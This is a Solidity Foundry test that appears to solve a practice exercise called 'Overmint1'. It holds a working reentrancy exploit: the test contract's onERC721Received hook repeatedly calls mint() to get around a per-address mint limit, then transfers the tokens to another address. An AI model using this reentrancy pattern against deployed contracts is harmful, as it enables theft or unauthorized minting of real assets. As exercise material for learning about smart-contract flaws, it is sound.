// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {Overmint1} from "../src/Overmint1.sol";
import {IERC721Receiver} from "lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

contract Overmint1Test is Test, IERC721Receiver {
    Overmint1 public overmint1;
    address public alice;

    function setUp() public {
        overmint1 = new Overmint1();
        alice = vm.addr(69);

    }

    // Attack Path:
    // 1. call the mint() function
    // 2. in the erc721receiver hook call the mint function until the totalSupply < 5
    // 3. transfer all the nft from test to attacker contract
    
    function testAttack() public {
        overmint1.mint();
        for(uint256 i = 0; i<5; i++){
            overmint1.transferFrom(address(this), alice, i+1);
        }
        console.log("Balance of Alice: %s", overmint1.balanceOf(alice));

    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns(bytes4) {
        if(overmint1.totalSupply() < 5) {
            overmint1.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}